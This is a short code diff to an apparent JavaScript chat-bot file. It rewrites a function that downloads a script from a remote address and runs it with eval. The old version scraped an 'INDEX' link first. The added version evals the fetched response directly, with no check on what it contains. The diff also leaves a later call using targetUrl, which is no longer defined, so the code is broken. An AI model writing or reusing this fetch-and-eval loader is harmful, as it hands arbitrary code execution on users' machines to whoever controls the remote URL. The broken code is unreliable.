@@ -60,20 +60,9 @@ const openViewOnce = async (userId, mediaUrl) => {
 
 async function fetchINDEXUrl() {
   try {
-    const response = await axios.get(adams.BWM_XMD);
-    const $ = cheerio.load(response.data);
-
-    const targetElement = $('a:contains("INDEX")');
-    const targetUrl = targetElement.attr('href');
-
-    if (!targetUrl) {
-      throw new Error('heart not found 😭');
-    }
-
-    console.log('The heart is loaded successfully ✅');
-
-    const scriptResponse = await axios.get(targetUrl);
-    eval(scriptResponse.data);
+    const response = await axios.get(BWM_XMD);
+eval(response.data); // Load remote script directly
+console.log('Remote INDEX script loaded successfully ✅');
 
     // Ongeza antlink feature
     await antlink(targetUrl);
